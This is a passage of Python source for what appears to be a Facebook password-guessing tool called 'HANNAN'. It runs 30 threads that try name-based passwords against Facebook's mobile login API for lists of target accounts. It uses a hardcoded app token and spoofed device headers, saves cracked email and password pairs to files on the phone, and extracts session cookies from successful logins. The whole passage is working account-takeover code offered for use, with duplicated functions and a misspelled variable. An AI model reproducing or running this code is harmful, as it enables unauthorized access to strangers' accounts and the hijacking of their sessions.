            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      



####@-----Random-----@####
def andom():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o': 
        tpp = input(f'{oo("?")}Total Password? : ')
        totalpass.append('first')
        totalpass.append('last')
        if tpp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(tpp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    os.system("clear")
    print(logo) 
    print('\033[1;93m='*25)
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/Hannan-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   



 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;97mHXW-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mHANNAN-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Hannan-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;97mHANNAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

      
    for x in open('.rndm','r').read().splitlines():
    	accounts.append(x)
    
    if m=='2':
        with speed(max_workers=30) as speeed:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()




Hxw_Main()
